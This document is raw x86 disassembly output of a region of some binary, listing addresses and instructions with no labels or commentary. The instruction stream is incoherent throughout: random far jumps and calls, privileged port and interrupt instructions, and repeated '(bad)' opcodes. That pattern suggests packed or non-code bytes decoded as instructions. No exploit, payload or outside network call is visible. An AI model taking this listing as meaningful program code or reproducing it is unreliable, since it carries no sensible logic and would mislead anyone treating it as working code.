  41e7fc:	outs   dx,BYTE PTR ds:[esi]
  41e7fd:	popf   
  41e7fe:	mov    dl,0x0
  41e800:	xor    al,0x86
  41e802:	ror    BYTE PTR [ebx],0xd9
  41e805:	sti    
  41e806:	dec    ebx
  41e807:	inc    ecx
  41e808:	scas   al,BYTE PTR es:[edi]
  41e809:	push   ebp
  41e80a:	mov    edi,0x413f99e4
  41e80f:	add    BYTE PTR [eax+0x0],0x0
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e82c
  41e881:	sub    al,BYTE PTR [ecx+0x54]
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0xe1000001,al
  41e88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e88e:	mov    esp,0x6d2e050e
  41e893:	stos   BYTE PTR es:[edi],al
  41e894:	data16 mov ch,0xa6
  41e897:	scas   eax,DWORD PTR es:[edi]
  41e898:	pop    ds
  41e899:	scas   eax,DWORD PTR es:[edi]
  41e89a:	sub    al,0xc0
  41e89c:	or     BYTE PTR [eax],cl
  41e89e:	mov    edx,0x3b151f39
  41e8a3:	cmp    al,0x71
  41e8a5:	add    ebx,ebx
  41e8a7:	hlt    
  41e8a8:	push   0x2eff82e2
  41e8ad:	jmp    0x4d030dca
  41e8b2:	sub    eax,0xc8418714
  41e8b7:	jle    0x41e8f9
  41e8b9:	lock js 0x41e930
  41e8bc:	iret   
  41e8bd:	mov    ss,ebx
  41e8bf:	cli    
  41e8c0:	cdq    
  41e8c1:	push   ss
  41e8c2:	cmp    ah,dh
  41e8c4:	test   eax,0xb3e6164
  41e8c9:	lahf   
  41e8ca:	inc    edx
  41e8cb:	test   BYTE PTR [esi],dl
  41e8cd:	xor    dl,ch
  41e8cf:	popf   
  41e8d0:	fdiv   QWORD PTR [edx-0x7f]
  41e8d3:	sub    al,0xb6
  41e8d5:	inc    edi
  41e8d6:	inc    al
  41e8d8:	cmp    DWORD PTR [ecx],edx
  41e8da:	sbb    DWORD PTR [ecx],0xffffffaa
  41e8dd:	jno    0x41e8ab
  41e8df:	jbe    0x41e8d0
  41e8e1:	xchg   ebx,eax
  41e8e2:	iret   
  41e8e3:	hlt    
  41e8e4:	pusha  
  41e8e5:	jbe    0x41e8ff
  41e8e7:	nop
  41e8e8:	mov    esp,0xe61df9aa
  41e8ed:	dec    esi
  41e8ee:	and    dl,BYTE PTR [ebx-0xa]
  41e8f1:	mov    dh,0x4e
  41e8f3:	inc    ecx
  41e8f4:	ins    DWORD PTR es:[edi],dx
  41e8f5:	xchg   esi,eax
  41e8f6:	push   es
  41e8f7:	sbb    DWORD PTR [ecx],edi
  41e8f9:	or     ebp,DWORD PTR [ecx]
  41e8fb:	pop    ebx
  41e8fc:	pusha  
  41e8fd:	in     eax,dx
  41e8fe:	js     0x41e920
  41e900:	popa   
  41e901:	test   edx,0x4780383a
  41e907:	cld    
  41e908:	nop
  41e909:	cdq    
  41e90a:	dec    esp
  41e90b:	call   FWORD PTR [eax+eiz*4+0x48a279d]
  41e912:	xor    edx,DWORD PTR [ebx+0x5e]
  41e915:	push   ds
  41e916:	hlt    
  41e917:	mov    cl,0x1
  41e919:	mov    edi,0xfbb77b50
  41e91e:	dec    ebx
  41e91f:	xchg   edi,eax
  41e920:	mov    ds:0xfc8751a,eax
  41e925:	inc    ebp
  41e926:	mov    cl,0xf3
  41e928:	mov    al,ds:0x5bd27013
  41e92d:	pop    ss
  41e92e:	jge    0x41e92f
  41e930:	mov    ah,0x8d
  41e932:	jmp    0xe33868fb
  41e937:	dec    ecx
  41e938:	mov    eax,ds:0x234872fa
  41e93d:	adc    ebx,DWORD PTR [ebp+0x67]
  41e940:	retf   0x8acc
  41e943:	cmp    al,0x1
  41e945:	or     edx,eax
  41e947:	dec    esi
  41e948:	mov    al,ds:0x36768c57
  41e94d:	sti    
  41e94e:	(bad)  
  41e94f:	mov    esp,0x4a57dacd
  41e954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e955:	add    BYTE PTR [ebp+0x1a39ed88],dh
  41e95b:	mov    al,0xe8
  41e95d:	out    0x15,eax
  41e95f:	push   edi
  41e960:	add    al,0x93
  41e962:	retf   
  41e963:	push   es
  41e964:	xchg   ecx,eax
  41e965:	stos   DWORD PTR es:[edi],eax
  41e966:	xor    dh,0xa0
  41e969:	pop    esp
  41e96a:	test   al,0xeb
  41e96c:	in     eax,0x1a
  41e96e:	in     eax,0x78
  41e970:	call   0x6a3f:0xb625a250
  41e977:	cmp    ebp,eax
  41e979:	je     0x41e8fd
  41e97b:	pop    edi
  41e97c:	scas   eax,DWORD PTR es:[edi]
  41e97d:	imul   ebp,ecx,0x5b71c045
  41e983:	mov    dh,0x36
  41e985:	cmp    eax,0xd0058850
  41e98a:	pusha  
  41e98b:	test   DWORD PTR ds:0xdb37813c,ebx
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	push   edx
  41ea01:	pop    es
  41ea02:	xor    BYTE PTR [ecx+0x16],cl
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x7b000001
  41ea0d:	adc    cl,BYTE PTR [esi+edx*4]
  41ea10:	mov    dh,0xe5
  41ea12:	mov    ebx,0xac995796
  41ea17:	aam    0x80
  41ea19:	jle    0x41ea2d
  41ea1b:	jmp    0x1a75:0x83f2b782
  41ea22:	loope  0x41ea4f
  41ea24:	xor    eax,0xade38f2a
  41ea29:	xchg   dh,dl
  41ea2b:	sbb    ch,BYTE PTR [edi+edx*8-0x6de0007d]
  41ea32:	cdq    
  41ea33:	jbe    0x41ea7f
  41ea35:	or     edx,DWORD PTR [ebx]
  41ea37:	sbb    DWORD PTR [ebp-0x2a],ebx
  41ea3a:	or     al,0xc6
  41ea3c:	ret    
  41ea3d:	mov    eax,ds:0x7a362f3e
  41ea42:	xchg   ebp,eax
  41ea43:	sub    cl,BYTE PTR [edi-0x1c]
  41ea46:	inc    BYTE PTR [edi+esi*1]
  41ea49:	or     eax,0xc9291af2
  41ea4e:	call   0x74ca6806
  41ea53:	enter  0xf1c,0x1f
  41ea57:	add    ch,BYTE PTR [edi+0x49]
  41ea5a:	ret    0xe1db
  41ea5d:	sbb    edi,esi
  41ea5f:	mov    bl,0x53
  41ea61:	push   0xc1818f37
  41ea66:	jge    0x41eac4
  41ea68:	shl    DWORD PTR [edx-0x1a159b0a],0x50
  41ea6f:	aas    
  41ea70:	or     dl,ah
  41ea72:	mov    dh,0xce
  41ea74:	retf   0xccbd
  41ea77:	jmp    DWORD PTR [ebx-0x47]
  41ea7a:	int3   
  41ea7b:	leave  
  41ea7c:	shr    DWORD PTR cs:[edx],0xb
  41ea80:	jnp    0x41eb00
  41ea82:	mov    ebp,0x643bd397
  41ea87:	jg     0x41ea68
  41ea89:	mov    eax,ds:0x21f61b39
  41ea8e:	int    0x6a
  41ea90:	sahf   
  41ea91:	lods   al,BYTE PTR fs:[esi]
  41ea93:	mov    dl,0x83
  41ea95:	jge    0x41eaaa
  41ea97:	xchg   ebp,eax
  41ea98:	jl     0x41eae9
  41ea9a:	lds    eax,FWORD PTR [edi]
  41ea9c:	mov    al,0x47
  41ea9e:	sbb    bl,ah
  41eaa0:	shl    BYTE PTR [esi+ebp*1+0x9b12850],0x9d
  41eaa8:	jb     0x41eabc
  41eaaa:	add    DWORD PTR [ecx+0x5a],ebp
  41eaad:	icebp  
  41eaae:	add    bl,ch
  41eab0:	and    BYTE PTR [esi+0x3f],bh
  41eab3:	xchg   edx,eax
  41eab4:	push   es
  41eab5:	stos   DWORD PTR es:[edi],eax
  41eab6:	shl    edx,cl
  41eab8:	ret    
  41eab9:	jbe    0x41eadd
  41eabb:	mov    ds:0x9a4f9b93,al
  41eac0:	sub    bl,bl
  41eac2:	lock add eax,0x242e6501
  41eac8:	jmp    FWORD PTR [edx]
  41eaca:	pop    ds
  41eacb:	je     0x41eaf8
  41eacd:	fisttp DWORD PTR [esp+ebx*1+0x16]
  41ead1:	xchg   ebx,eax
  41ead2:	xor    eax,0x4cf4090f
  41ead7:	push   es
  41ead8:	jns    0x41eae7
  41eada:	push   esp
  41eadb:	ss shr ebp,1
  41eade:	mov    ds:0xfdf14747,eax
  41eae3:	fmul   QWORD PTR [edi+0x2478d955]
  41eae9:	loopne 0x41eb61
  41eaeb:	push   edx
  41eaec:	pusha  
  41eaed:	retf   
  41eaee:	jge    0x41ea8f
  41eaf0:	pop    ss
  41eaf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaf2:	sti    
  41eaf3:	xchg   ebx,eax
  41eaf4:	jbe    0x41eb6f
  41eaf6:	sub    BYTE PTR [ecx],0xbc
  41eaf9:	sbb    ebp,DWORD PTR [ebx-0x5d]
  41eafc:	test   eax,0x5cf840c3
  41eb01:	sub    ah,BYTE PTR ds:0x146e54a2
  41eb07:	ds stos BYTE PTR es:[edi],al
  41eb09:	ror    BYTE PTR [edx-0x62],0xa
  41eb0d:	outs   dx,BYTE PTR ds:[esi]
  41eb0e:	mov    esp,0x294b
	...
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x51
  41eb81:	mov    ecx,0x471bb4e6
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0x12000001
  41eb8d:	(bad)  
  41eb8f:	popf   
  41eb90:	jb     0x41eb8b
  41eb92:	lds    esp,FWORD PTR [ecx]
  41eb94:	mov    edx,0x3ba4d519
  41eb99:	adc    eax,0x82cf0b92
  41eb9e:	xlat   BYTE PTR ds:[ebx]
  41eb9f:	cmc    
  41eba0:	mov    bl,0xbd
  41eba2:	add    DWORD PTR [ecx],esi
  41eba4:	jg     0x41eb57
  41eba6:	es cmp eax,0x633a85b7
  41ebac:	cmc    
  41ebad:	xor    esi,edx
  41ebaf:	(bad)  
  41ebb0:	(bad)  
  41ebb1:	cli    
  41ebb2:	dec    ebp
  41ebb3:	xor    al,0xf0
  41ebb5:	fist   DWORD PTR [ecx+0xd7d47d7]
  41ebbb:	ror    BYTE PTR [ebx+0x5d],cl
  41ebbe:	sub    al,0xc5
  41ebc0:	xchg   ecx,eax
  41ebc1:	xchg   ebx,eax
  41ebc2:	in     eax,dx
  41ebc3:	pop    ss
  41ebc4:	bound  edi,QWORD PTR [ecx]
  41ebc6:	in     eax,dx
  41ebc7:	stc    
  41ebc8:	rcr    BYTE PTR [eax-0x30e8e801],1
  41ebce:	add    eax,0xdc01f242
  41ebd3:	jge    0x41ebca
  41ebd5:	mov    dl,0x1
  41ebd7:	and    BYTE PTR [esp+edi*2-0xc],dh
  41ebdb:	push   ecx
  41ebdc:	es imul ecx,eax,0x51
  41ebe0:	cdq    
  41ebe1:	out    dx,eax
  41ebe2:	daa    
  41ebe3:	xchg   DWORD PTR [eax],esi
  41ebe5:	aas    
  41ebe6:	or     ebx,ecx
  41ebe8:	mov    eax,ds:0x3ddbd676
  41ebed:	xchg   BYTE PTR [ecx-0x46],dh
  41ebf0:	mov    ebp,0x398a72a9
  41ebf5:	out    dx,eax
  41ebf6:	or     esi,esi
  41ebf8:	pop    ss
  41ebf9:	mov    eax,ds:0x1f10800c
  41ebfe:	xchg   edi,eax
  41ebff:	out    0xa1,al
  41ec01:	mov    dh,0x90
  41ec03:	push   ecx
  41ec04:	jne    0x41ec67
  41ec06:	ins    BYTE PTR es:[edi],dx
  41ec07:	mov    ebx,0x513844b9
  41ec0c:	cmp    bl,bh
  41ec0e:	or     BYTE PTR [esp+eiz*8-0x7e8c1106],ah
  41ec15:	add    DWORD PTR [ebx+0x319a97fd],ecx
  41ec1b:	push   esp
  41ec1c:	push   esi
  41ec1d:	les    esi,FWORD PTR [ebx+0x74]
  41ec20:	sub    edx,0xfb18cac0
  41ec26:	loopne 0x41ec49
  41ec28:	or     ah,BYTE PTR [edx+edi*8-0x38236d03]
  41ec2f:	sbb    eax,0xd6bcc885
  41ec34:	sub    edx,DWORD PTR [edi+0x40]
  41ec37:	xchg   edx,eax
  41ec38:	sbb    esi,DWORD PTR [esi+0x2a9a1f1f]
  41ec3e:	daa    
  41ec3f:	mov    edx,0xf40646c2
  41ec44:	and    ebp,DWORD PTR [edi-0x1a]
  41ec47:	push   0xf1cb5816
  41ec4c:	cdq    
  41ec4d:	mov    ch,0x58
  41ec4f:	dec    eax
  41ec50:	int3   
  41ec51:	or     eax,0xdb8619da
  41ec56:	pop    esp
  41ec57:	in     al,0x6c
  41ec59:	fs adc eax,0xfb73d2eb
  41ec5f:	or     dl,BYTE PTR ds:0x9026cb1a
  41ec65:	pusha  
  41ec66:	adc    DWORD PTR [edi-0x44],edx
  41ec69:	cld    
  41ec6a:	fs or  eax,0x289e9aed
  41ec70:	and    esp,DWORD PTR [ebp-0xe]
  41ec73:	sahf   
  41ec74:	jge    0x41ebfd
  41ec76:	xchg   bl,dh
  41ec78:	and    al,0xe1
  41ec7a:	sub    eax,0x7bcfa494
  41ec7f:	cmp    BYTE PTR [edi],0x9a
  41ec82:	push   0xffffffd7
  41ec84:	leave  
  41ec85:	push   eax
  41ec86:	aad    0x7f
  41ec88:	add    esp,0xffffff98
  41ec8b:	inc    ecx
  41ec8c:	push   ds
  41ec8d:	imul   ecx,eax,0x6706
	...
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xcb35fd0
  41ed02:	push   0x14820f9
  41ed07:	add    BYTE PTR ds:0x47000001,al
  41ed0d:	dec    esi
  41ed0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed0f:	or     ch,BYTE PTR es:[ecx-0x727dbed8]
  41ed16:	xor    eax,0x170fbebf
  41ed1b:	dec    edx
  41ed1c:	add    BYTE PTR cs:[eax-0x58187fe7],ah
  41ed23:	fs cmc 
  41ed25:	jmp    0x41ed74
  41ed27:	mov    eax,ds:0xf21d9133
  41ed2c:	push   esp
  41ed2d:	int    0xf1
  41ed2f:	aaa    
  41ed30:	test   al,0x58
  41ed32:	mov    al,ds:0xa6beb7af
  41ed37:	rol    esi,0xf4
  41ed3a:	mov    WORD PTR [eax],?
  41ed3c:	fwait
  41ed3d:	loope  0x41ed0e
  41ed3f:	sahf   
  41ed40:	jns    0x41ed01
  41ed42:	lds    ecx,FWORD PTR [ebp-0x79e59c8d]
  41ed48:	mov    edi,0xfb8bd433
  41ed4d:	jbe    0x41ed00
  41ed4f:	inc    edx
  41ed50:	out    dx,al
  41ed51:	fmul   QWORD PTR [edi]
  41ed53:	pop    ss
  41ed54:	sub    eax,DWORD PTR [edi+0x49]
  41ed57:	lock into 
  41ed59:	mov    edi,0xab8046c
  41ed5e:	mov    ebx,0x194df574
  41ed63:	cmp    al,0x59
  41ed65:	push   0x90c72e39
  41ed6a:	inc    ecx
  41ed6b:	mov    al,0xa1
  41ed6d:	test   eax,0x7242cf46
  41ed72:	jmp    0x669c:0xfae1dd17
  41ed79:	mov    edi,0x2ed7b1cc
  41ed7e:	mov    cl,0x43
  41ed80:	mov    esp,0x8a864113
  41ed85:	aad    0xb3
  41ed87:	cmp    BYTE PTR [eax],ch
  41ed89:	aas    
  41ed8a:	push   esi
  41ed8b:	sub    al,0x4a
  41ed8d:	std    
  41ed8e:	jno    0x41edca
  41ed90:	jmp    0xe6b0:0x2987f25d
  41ed97:	call   0x644ff901
  41ed9c:	mov    ebx,0x6ebb39d9
  41eda1:	jb     0x41edf6
  41eda3:	mov    al,0x4f
  41eda5:	dec    esp
  41eda6:	pop    ebp
  41eda7:	ja     0x41ede8
  41eda9:	sbb    al,0x54
  41edab:	mov    ah,0xd1
  41edad:	mov    dl,0x87
  41edaf:	cdq    
  41edb0:	push   eax
  41edb1:	int3   
  41edb2:	mov    ebp,0x3c902c57
  41edb7:	cmp    DWORD PTR [ebp+0x371ac9b7],eax
  41edbd:	sbb    ch,BYTE PTR [ebx]
  41edbf:	mov    eax,0x25f2eb32
  41edc4:	test   al,0xf9
  41edc6:	mov    DWORD PTR [edi-0x47],ebp
  41edc9:	loop   0x41ed7d
  41edcb:	push   0x76532a3
  41edd0:	or     eax,0x2c7e9064
  41edd5:	cld    
  41edd6:	outs   dx,DWORD PTR ds:[esi]
  41edd7:	sbb    ebx,DWORD PTR [ebx+0x10]
  41edda:	std    
  41eddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eddc:	shl    DWORD PTR [edx+0x126900d7],1
  41ede2:	mov    bl,0xa6
  41ede4:	adc    DWORD PTR [ebp-0x41bd1d58],esp
  41edea:	or     BYTE PTR [ecx+ebp*2],dh
  41eded:	hlt    
  41edee:	and    cl,al
  41edf0:	or     DWORD PTR [edi-0x54],ebp
  41edf3:	inc    esp
  41edf4:	loopne 0x41edcf
  41edf6:	adc    al,0x8
  41edf8:	ja     0x41ee4b
  41edfa:	cmp    al,0x4e
  41edfc:	fwait
  41edfd:	pop    ebx
  41edfe:	fwait
  41edff:	call   0x8a83:0xea70e3a
  41ee06:	cmp    ebp,DWORD PTR [eax+0x54680f8c]
  41ee0c:	xor    DWORD PTR [esi+esi*1+0xe848],0x0
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x253a:0xc301e0e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x95000001
  41ee8d:	int3   
  41ee8e:	imul   ebp,DWORD PTR [eax+0x33192a57],0xffffffd1
  41ee95:	jecxz  0x41ee3e
  41ee97:	repz call 0x4a46:0x8b11630d
  41ee9f:	xor    bl,BYTE PTR [edi+0x5bfd0f58]
  41eea5:	cli    
  41eea6:	std    
  41eea7:	loop   0x41eece
  41eea9:	or     BYTE PTR [esi-0x37153448],bl
  41eeaf:	jg     0x41eeff
  41eeb1:	js     0x41eeb4
  41eeb3:	aad    0x8f
  41eeb5:	outs   dx,BYTE PTR ds:[esi]
  41eeb6:	jo     0x41ef2d
  41eeb8:	jp     0x41ee73
  41eeba:	mov    ecx,0xdcb7c2f8
  41eebf:	xchg   DWORD PTR [ebx-0x3352f206],ebp
  41eec5:	dec    esp
  41eec6:	out    dx,eax
  41eec7:	in     al,dx
  41eec8:	(bad)  
  41eec9:	stc    
  41eeca:	adc    bh,BYTE PTR [edi]
  41eecc:	psrlq  mm7,0x57
  41eed0:	jl     0x41ee77
  41eed2:	add    BYTE PTR [ecx],ch
  41eed4:	retf   0xcd94
  41eed7:	test   esi,edi
  41eed9:	push   ss
  41eeda:	out    dx,al
  41eedb:	push   ebp
  41eedc:	ja     0x41eec3
  41eede:	pop    es
  41eedf:	shr    BYTE PTR [esi+0x6e],1
  41eee2:	fstp   QWORD PTR [edx+0x34]
  41eee5:	jae    0x41ef3c
  41eee7:	pop    esp
  41eee8:	std    
  41eee9:	lock mov esi,DWORD PTR [eax+ecx*8]
  41eeed:	mov    eax,ds:0xcb1eb02b
  41eef2:	mov    al,0x9c
  41eef4:	jnp    0x41eef8
  41eef6:	mov    eax,0x8935d1c6
  41eefb:	xchg   ebp,eax
  41eefc:	xor    DWORD PTR [ecx-0x11b46029],edx
  41ef02:	push   es
  41ef03:	push   ss
  41ef04:	fucomp st(7)
  41ef06:	pop    ds
  41ef07:	xor    ebp,eax
  41ef09:	fld    st(7)
  41ef0b:	xor    al,0x31
  41ef0d:	pop    ebx
  41ef0e:	inc    ebp
  41ef0f:	mov    edi,0xb82c5508
  41ef14:	test   BYTE PTR [edi-0x150a8243],al
  41ef1a:	stc    
  41ef1b:	lock pop eax
  41ef1d:	sub    eax,ebp
  41ef1f:	cwde   
  41ef20:	fldcw  WORD PTR [ecx-0x76679e2e]
  41ef26:	xchg   ebp,eax
  41ef27:	inc    edx
  41ef28:	xchg   edx,eax
  41ef29:	inc    edx
  41ef2a:	cmp    BYTE PTR [ebp+0x5b],0xf8
  41ef2e:	mov    BYTE PTR [esi+0x49],ch
  41ef31:	sub    DWORD PTR [ecx+0x32],0x5bedd933
  41ef38:	fidivr DWORD PTR [edi-0x3d86b8e9]
  41ef3e:	je     0x41ef87
  41ef40:	push   ebp
  41ef41:	or     BYTE PTR gs:[ebx+0x20deb48f],ah
  41ef48:	aaa    
  41ef49:	push   ss
  41ef4a:	in     al,0xe
  41ef4c:	sub    BYTE PTR [eax+0x11],bl
  41ef4f:	or     eax,0x4c74555f
  41ef54:	xlat   BYTE PTR ds:[ebx]
  41ef55:	dec    ecx
  41ef56:	and    al,0xc6
  41ef58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef59:	out    0xf7,eax
  41ef5b:	add    edx,edx
  41ef5d:	cmp    DWORD PTR [esi+edx*4-0x4a157f9a],esi
  41ef64:	test   DWORD PTR [eax+0x3bba7990],ebp
  41ef6a:	cmp    DWORD PTR [edx],ecx
  41ef6c:	jnp    0x41ef21
  41ef6e:	jmp    0x6d8a:0x27f29506
  41ef75:	and    BYTE PTR [ebx-0xd43184f],0x87
  41ef7c:	nop
  41ef7d:	pushf  
  41ef7e:	cli    
  41ef7f:	std    
  41ef80:	test   eax,0x3567d738
  41ef85:	push   ebx
  41ef86:	stc    
  41ef87:	in     al,0xda
  41ef89:	pop    edx
  41ef8a:	das    
  41ef8b:	adc    eax,0x5cf3a34e
  41ef90:	mov    eax,ds:0x0
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebp,ebx,0x6b
  41f002:	cld    
  41f003:	sub    DWORD PTR [edx],0x500014a
  41f009:	add    DWORD PTR [eax],eax
  41f00b:	add    BYTE PTR [edi+0x3f],ch
  41f00e:	imul   ebp,DWORD PTR [ecx+0x22],0x66
  41f012:	test   al,0xa6
  41f014:	add    al,0xb3
  41f016:	fcmovnbe st,st(7)
  41f018:	cmp    esi,ebx
  41f01a:	ins    DWORD PTR es:[edi],dx
  41f01b:	xor    al,0xec
  41f01d:	sbb    ebp,eax
  41f01f:	sub    edi,DWORD PTR [edx+0x27]
  41f022:	repz and al,0x5f
  41f025:	push   0xfffffffb
  41f027:	js     0x41efcf
  41f029:	jge    0x41efc1
  41f02b:	daa    
  41f02c:	sti    
  41f02d:	push   esi
  41f02e:	in     eax,dx
  41f02f:	cmp    BYTE PTR [ecx+0x55fbfdcf],ah
  41f035:	jmp    0x2d27ce26
  41f03a:	ss lahf 
  41f03c:	add    cl,BYTE PTR [edx+0x590c6f7]
  41f042:	cdq    
  41f043:	mov    DWORD PTR [eax-0x3d7cad03],ebp
  41f049:	ficomp WORD PTR [edi]
  41f04b:	inc    ebx
  41f04c:	jne    0x41f019
  41f04e:	fwait
  41f04f:	scas   al,BYTE PTR es:[edi]
  41f050:	lods   al,BYTE PTR ds:[esi]
  41f051:	add    esi,edx
  41f053:	push   cs
  41f054:	ss dec edx
  41f056:	imul   eax,eax,0x5f
  41f059:	sti    
  41f05a:	push   edx
  41f05b:	push   esp
  41f05c:	imul   ebp,DWORD PTR [edx-0x5f],0xc5bb9ac
  41f063:	bound  edx,QWORD PTR [edx]
  41f065:	sbb    eax,0x1ad116ea
  41f06a:	jmp    0xe51b8d9a
  41f06f:	push   0xfffffff9
  41f071:	(bad)
  41f075:	clc    
  41f076:	and    eax,0xe4e3ab56
  41f07b:	sub    ax,0x68f8
  41f07f:	push   esi
  41f080:	pop    ebp
  41f081:	add    DWORD PTR [eax-0x31],ebx
  41f084:	xchg   esp,eax
  41f085:	jo     0x41f03e
  41f087:	dec    esp
  41f088:	cmp    bl,BYTE PTR [ebp+0x4f]
  41f08b:	add    al,0xef
  41f08d:	(bad)  
  41f08e:	(bad)  
  41f08f:	fisttp DWORD PTR [edi-0x3dbe3a9b]
  41f095:	dec    ebx
  41f096:	neg    dl
  41f098:	mul    ch
  41f09a:	aad    0x2
  41f09c:	(bad)  
  41f09d:	js     0x41f0e0
  41f09f:	xchg   ecx,eax
  41f0a0:	and    BYTE PTR [edx-0x3f004e9d],ch
  41f0a6:	test   al,0x7f
  41f0a8:	idiv   BYTE PTR [esi]
  41f0aa:	enter  0xec91,0x79
  41f0ae:	bound  esi,QWORD PTR [edx+edi*1+0x10]
  41f0b2:	gs inc esp
  41f0b4:	ret    0x7360
  41f0b7:	or     ah,BYTE PTR [ebx+0x45]
  41f0ba:	je     0x41f0b1
  41f0bc:	jns    0x41f099
  41f0be:	sub    DWORD PTR [ecx+0x5ac11d76],ebx
  41f0c4:	les    eax,FWORD PTR [ebp+0x72f91e95]
  41f0ca:	jmp    0x4ada55
  41f0cf:	lea    esi,[ebx+0x333d8d65]
  41f0d5:	loope  0x41f0df
  41f0d7:	jmp    0x37d7:0x2614262a
  41f0de:	jecxz  0x41f077
  41f0e0:	mov    bl,0xce
  41f0e2:	dec    ebx
  41f0e3:	push   ds
  41f0e4:	inc    ebx
  41f0e5:	loopne 0x41f0bf
  41f0e7:	inc    ebp
  41f0e8:	and    al,0x38
  41f0ea:	daa    
  41f0eb:	fnstenv [ebx+edi*1-0x1b59bdc0]
  41f0f2:	aam    0x4c
  41f0f4:	fld    QWORD PTR [eax+0x35]
  41f0f7:	(bad)  
  41f0f8:	sub    DWORD PTR [edx+0x6efba479],ecx
  41f0fe:	in     al,0x98
  41f100:	inc    eax
  41f101:	ins    BYTE PTR es:[edi],dx
  41f102:	xor    DWORD PTR [ecx],ebx
  41f104:	dec    edx
  41f105:	(bad)  
  41f106:	fdiv   QWORD PTR [edx-0x27]
  41f109:	add    DWORD PTR [edi],esp
  41f10b:	(bad)  
  41f10c:	fimul  WORD PTR [edx]
  41f10e:	into   
  41f10f:	jo     0x41f09c
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0xc2d9cf80
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xf3000001
  41f18d:	mov    eax,ds:0xb92d70c4
  41f192:	cs nop
  41f194:	inc    esp
  41f195:	sbb    eax,0x820dc31b
  41f19a:	fcomp  QWORD PTR [edx-0x36]
  41f19d:	cmp    ebx,DWORD PTR [eax+0x17]
  41f1a0:	push   ebp
  41f1a1:	and    BYTE PTR [eax+0x145ed434],0xab
  41f1a8:	jno    0x41f12b
  41f1aa:	cmp    al,0x3
  41f1ac:	pop    ebp
  41f1ad:	xchg   DWORD PTR [ecx+0x39],esi
  41f1b0:	ret    
  41f1b1:	fidivr DWORD PTR [ebx]
  41f1b3:	call   0xdbe3:0x18b6f733
  41f1ba:	sar    DWORD PTR [edx+0x7f3827dc],0x3e
  41f1c1:	ficom  DWORD PTR [esi-0x14c37f90]
  41f1c7:	in     eax,0xcb
  41f1c9:	sub    bh,BYTE PTR [esi-0x45076690]
  41f1cf:	sbb    DWORD PTR [edi-0x402f0535],0xffffff92
  41f1d6:	test   al,0x45
  41f1d8:	das    
  41f1d9:	mov    ebx,es
  41f1db:	popf   
  41f1dc:	dec    eax
  41f1dd:	or     eax,0xfa1d9159
  41f1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1e3:	(bad)  
  41f1e5:	cli    
  41f1e6:	xor    BYTE PTR [ebx+0x2b485d45],bl
  41f1ec:	jle    0x41f1ef
  41f1ee:	scas   eax,DWORD PTR es:[edi]
  41f1ef:	inc    edx
  41f1f0:	mov    edi,0x1e5104fb
  41f1f5:	iret   
  41f1f6:	mov    esi,0x83ff536c
  41f1fb:	cmp    eax,0xa1da1552
  41f200:	pusha  
  41f201:	nop
  41f202:	aaa    
  41f203:	cmp    BYTE PTR [ebx],0x7d
  41f206:	out    dx,al
  41f207:	xor    DWORD PTR [ebx+0x48],ebp
  41f20a:	in     eax,dx
  41f20b:	jmp    0x2a6f:0xf5df2bdc
  41f212:	lock xchg ebx,eax
  41f214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f215:	or     BYTE PTR [ebx],ah
  41f217:	xor    al,0xf9
  41f219:	les    ebx,FWORD PTR [ecx+0x5c5dfbf9]
  41f21f:	sub    BYTE PTR [ecx],bl
  41f221:	xchg   ebp,eax
  41f222:	es pop esp
  41f224:	mov    edi,0x8e3d25ff
  41f229:	(bad)  
  41f22a:	cwde   
  41f22b:	stos   BYTE PTR es:[edi],al
  41f22c:	mov    ebp,ebx
  41f22e:	fs xor eax,0x4c
  41f232:	sbb    edx,DWORD PTR [esi+0x1d]
  41f235:	mov    eax,0xf8e92549
  41f23a:	ins    DWORD PTR es:[edi],dx
  41f23b:	repnz inc ebp
  41f23d:	in     al,0xb6
  41f23f:	mov    dh,0x92
  41f241:	iret   
  41f242:	dec    eax
  41f243:	fst    st(3)
  41f245:	push   0x308e8938
  41f24a:	fsubr  st(3),st
  41f24c:	mov    ah,0xaa
  41f24e:	mov    ch,0x9d
  41f250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f251:	dec    ebp
  41f252:	sbb    dh,ch
  41f254:	pop    esp
